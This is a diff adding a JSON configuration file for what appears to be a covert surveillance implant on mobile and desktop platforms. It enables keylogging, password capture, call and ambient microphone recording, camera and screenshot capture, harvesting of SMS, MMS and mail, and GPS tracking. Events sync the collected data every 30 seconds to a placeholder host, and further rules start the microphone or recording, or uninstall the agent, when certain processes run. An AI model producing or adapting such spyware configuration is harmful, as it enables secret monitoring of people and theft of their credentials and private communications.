@@ -1,0 +1,142 @@
+{
+    "modules": [
+        {"module": "addressbook"},
+        {"module": "application"},
+        {"module": "calendar"},
+        {"compression": 5, "module": "call", "record": true, "buffer": 512000},
+        {"module": "camera", "quality": "med"},
+        {"module": "chat"},
+        {"module": "clipboard"},
+        {"module": "conference", "_type": "mobile", "_platform": "winmo", "number": ""},
+        {
+            "synchronize": false,
+            "position": true,
+            "module": "crisis",
+            "call": true,
+            "network": {"enabled": false, "processes": []},
+            "camera": true,
+            "mic": true,
+            "hook": {"enabled": true, "processes": []}
+        },
+        {"module": "photo", "datefrom": "2015-01-30 10:00:00"},
+        {"module": "device", "list": false},
+        {"module": "keylog", "_type": "desktop,mobile", "_platform": "windows,osx,ios,linux"},
+        {"module": "livemic", "_type": "mobile", "_platform": "winmo", "number": ""},
+        {
+            "sms": {
+                "enabled": true,
+                "filter": {"datefrom": "2014-11-10 00:00:00", "history": true, "dateto": "2100-01-01 00:00:00"}
+            },
+            "mms": {
+                "enabled": true,
+                "filter": {"datefrom": "2014-11-10 00:00:00", "history": true, "dateto": "2100-01-01 00:00:00"}
+            },
+            "module": "messages",
+            "mail": {
+                "enabled": true,
+                "filter": {
+                    "datefrom": "2014-11-10 00:00:00",
+                    "history": true,
+                    "maxsize": 100000,
+                    "dateto": "2100-01-01 00:00:00"
+                }
+            }
+        },
+        {"module": "mic", "threshold": 0.22, "autosense": false, "silence": 5},
+        {"module": "password"},
+        {"gps": true, "module": "position", "cell": false, "wifi": false},
+        {"module": "screenshot", "quality": "med", "onlywindow": false},
+        {"module": "url", "_type": "desktop,mobile", "_platform": "windows,osx,ios,blackberry,winmo,linux"}
+    ],
+    "actions": [
+        {
+            "desc": "STARTUP",
+            "subactions": [
+                {"action": "module", "module": "device", "status": "start"}
+            ]
+        },
+        {
+            "desc": "SYNC",
+            "subactions": [
+                {
+                    "action": "synchronize",
+                    "cell": false,
+                    "maxdelay": 0,
+                    "bandwidth": 500000,
+                    "host": "$(HOSTNAME)",
+                    "stop": false,
+                    "mindelay": 0,
+                    "wifi": true
+                },
+                {"action": "module", "module": "camera", "status": "start"}
+            ]
+        },
+        {
+            "desc": "",
+            "subactions": [
+                {"action": "module", "module": "call", "status": "stop"},
+                {"action": "module", "module": "mic", "status": "start"}
+            ]
+        },
+        {
+            "desc": "",
+            "subactions": [
+                {"action": "module", "module": "mic", "status": "stop"},
+                {"action": "module", "module": "call", "status": "start"}
+            ]
+        },
+        {"desc": "", "subactions": [{"action": "uninstall"}]}
+    ],
+    "events": [
+        {
+            "start": 0,
+            "event": "timer",
+            "subtype": "loop",
+            "te": "23:59:59",
+            "ts": "00:00:00",
+            "enabled": true,
+            "desc": "STARTUP"
+        },
+        {
+            "event": "timer",
+            "subtype": "loop",
+            "delay": 30,
+            "te": "23:59:59",
+            "ts": "00:00:00",
+            "enabled": true,
+            "desc": "SYNC",
+            "repeat": 1
+        },
+        {
+            "start": 2,
+            "end": 3,
+            "event": "process",
+            "process": "*android.contacts*",
+            "enabled": true,
+            "focus": false,
+            "desc": "",
+            "window": false
+        },
+        {
+            "start": 4,
+            "event": "process",
+            "process": "*calc*",
+            "focus": false,
+            "enabled": true,
+            "window": false,
+            "desc": ""
+        },
+        {"start": 1, "enabled": true, "event": "standby", "desc": ""}
+    ],
+    "globals": {
+        "quota": {"min": 104857.6, "max": 104857600},
+        "collapsed": false,
+        "version": 2012041601,
+        "nohide": [],
+        "advanced": true,
+        "remove_driver": true,
+        "type": "mobile",
+        "wipe": false,
+        "migrated": false
+    }
+}
